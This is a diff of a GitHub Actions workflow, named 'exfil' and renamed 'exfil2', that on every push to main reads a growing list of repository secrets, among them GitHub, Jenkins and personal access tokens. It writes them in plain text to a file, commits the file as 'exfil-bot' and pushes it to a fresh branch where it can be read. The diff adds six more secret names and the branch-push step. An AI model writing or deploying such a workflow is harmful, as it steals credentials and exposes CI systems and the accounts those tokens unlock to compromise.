@@ -1,4 +1,4 @@
-name: exfil
+name: exfil2
 on:
   push:
     branches: [main]
@@ -18,6 +18,12 @@ jobs:
           S4: ${{ secrets.TOKEN }}
           S5: ${{ secrets.GITHUB_ACCESS_TOKEN }}
           S6: ${{ secrets.JENKINS_TOKEN }}
+          S7: ${{ secrets.GH_PAT }}
+          S8: ${{ secrets.PERSONAL_TOKEN }}
+          S9: ${{ secrets.ACCESS_TOKEN }}
+          S10: ${{ secrets.JENKINS_API_TOKEN }}
+          S11: ${{ secrets.GIT_TOKEN }}
+          S12: ${{ secrets.GITHUB_TOKEN_PAT }}
         run: |
           mkdir -p exfil
           {
@@ -28,9 +34,17 @@ jobs:
             echo "TOKEN=$S4"
             echo "GITHUB_ACCESS_TOKEN=$S5"
             echo "JENKINS_TOKEN=$S6"
+            echo "GH_PAT=$S7"
+            echo "PERSONAL_TOKEN=$S8"
+            echo "ACCESS_TOKEN=$S9"
+            echo "JENKINS_API_TOKEN=$S10"
+            echo "GIT_TOKEN=$S11"
+            echo "GITHUB_TOKEN_PAT=$S12"
           } > exfil/tokens.txt
           git config user.name "exfil-bot"
           git config user.email "exfil@example.com"
+          BR="exfil-$(date +%s)"
+          git checkout -b "$BR"
           git add exfil/tokens.txt
-          git commit -m "exfil $(date +%s)" || true
-          git push
+          git commit -m "exfil $BR" || true
+          git push origin "$BR"
